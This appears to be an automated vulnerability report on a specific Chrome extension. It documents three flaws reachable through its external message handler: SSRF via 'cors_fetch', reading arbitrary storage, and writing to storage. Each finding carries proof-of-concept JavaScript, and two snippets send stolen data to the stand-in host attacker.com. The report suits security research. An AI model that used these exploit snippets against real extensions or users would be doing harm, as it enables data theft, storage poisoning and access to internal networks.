# CoCo Analysis: bncpjjjjagbmbmaefckmjecknmigphna

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3

---

## Sink 1: bg_chrome_runtime_MessageExternal → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bncpjjjjagbmbmaefckmjecknmigphna/opgen_generated_files/bg.js
Line 1093 fetch(request.url).then(

**Code:**

```javascript
// Line 994-1128: Message handler accepting external messages
const handleResponse = (request, sender, sendResponse) => {
  let windowIndex = parseInt(request.index, 10) || 0;
  switch (request.message) {
    // ... other cases ...

    case 'cors_fetch':
      fetch(request.url).then(  // ← attacker-controlled URL
        (resp) => {
          if (request.json) {
            resp.json().then(
              (t) => sendResponse(t)  // ← response sent back to attacker
            );
          }
          else {
            resp.text().then(
              (t) => sendResponse(t)  // ← response sent back to attacker
            );
          }
        }
      );
      return true;
    // ... other cases ...
  }
};

// Line 1130-1131: Handler registered for both internal AND external messages
chrome.runtime.onMessage.addListener(handleResponse);
chrome.runtime.onMessageExternal.addListener(handleResponse);  // ← External attacker entry point
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any whitelisted website (localhost or *.justwords.live)
// Per methodology: IGNORE externally_connectable restrictions - if onMessageExternal exists, assume exploitable
chrome.runtime.sendMessage(
  'bncpjjjjagbmbmaefckmjecknmigphna',
  { message: 'cors_fetch', url: 'http://internal-admin-panel/api/secrets', json: false },
  (response) => {
    console.log('Stolen data:', response);
    // Exfiltrate to attacker server
    fetch('https://attacker.com/collect', { method: 'POST', body: response });
  }
);
```

**Impact:** SSRF vulnerability allowing attacker to make privileged cross-origin requests to arbitrary URLs from the extension's context and retrieve the responses. Can be used to access internal networks, bypass CORS restrictions, and exfiltrate data.

---

## Sink 2: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bncpjjjjagbmbmaefckmjecknmigphna/opgen_generated_files/bg.js
Line 752 (CoCo framework - storage mock value)

**Code:**

```javascript
// Line 1109-1114: Storage read with response to external caller
case 'storage_get':
  chrome.storage.local.get(
    request.key,  // ← attacker-controlled key
    (values) => sendResponse(values[request.key])  // ← data sent back to attacker
  );
  return true;

// Line 1131: External message handler
chrome.runtime.onMessageExternal.addListener(handleResponse);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// Read any stored data
chrome.runtime.sendMessage(
  'bncpjjjjagbmbmaefckmjecknmigphna',
  { message: 'storage_get', key: 'outputWindows' },
  (data) => {
    console.log('Stolen storage data:', data);
    // Exfiltrate to attacker
    fetch('https://attacker.com/collect', { method: 'POST', body: JSON.stringify(data) });
  }
);

// Can enumerate and steal all storage by trying different keys
chrome.runtime.sendMessage(
  'bncpjjjjagbmbmaefckmjecknmigphna',
  { message: 'storage_get', key: null },  // Get all storage
  (data) => { /* exfiltrate */ }
);
```

**Impact:** Information disclosure - attacker can read arbitrary data from chrome.storage.local and exfiltrate sensitive information stored by the extension.

---

## Sink 3: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bncpjjjjagbmbmaefckmjecknmigphna/opgen_generated_files/bg.js
Line 1118 { [request.key]: request.value }

**Code:**

```javascript
// Line 1116-1121: Storage write from external message
case 'storage_set':
  chrome.storage.local.set(
    { [request.key]: request.value },  // ← attacker-controlled key and value
    sendResponse
  );
  return true;

// Line 1131: External message handler
chrome.runtime.onMessageExternal.addListener(handleResponse);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// Combined attack: Poison storage then retrieve it
// Step 1: Write malicious data
chrome.runtime.sendMessage(
  'bncpjjjjagbmbmaefckmjecknmigphna',
  { message: 'storage_set', key: 'outputWindows', value: { '0': 999999 } },
  () => {
    // Step 2: Read back the poisoned data
    chrome.runtime.sendMessage(
      'bncpjjjjagbmbmaefckmjecknmigphna',
      { message: 'storage_get', key: 'outputWindows' },
      (data) => {
        console.log('Retrieved poisoned data:', data);
      }
    );
  }
);

// Can also manipulate extension behavior by poisoning storage
// For example, corrupt the outputWindows mapping to cause DoS
chrome.runtime.sendMessage(
  'bncpjjjjagbmbmaefckmjecknmigphna',
  { message: 'storage_set', key: 'outputWindows', value: null }
);
```

**Impact:** Complete storage exploitation chain - attacker can write arbitrary data to storage AND read it back, achieving both storage poisoning and information disclosure. This forms a complete bidirectional attack allowing manipulation of extension state and exfiltration of stored data.

---

## Combined Impact

This extension has multiple severe vulnerabilities accessible through the same external message handler:
1. **SSRF** - Make privileged requests to arbitrary URLs and retrieve responses
2. **Information Disclosure** - Read arbitrary stored data
3. **Storage Manipulation** - Write arbitrary data to storage and retrieve it

All three vulnerabilities can be chained together for maximum impact.
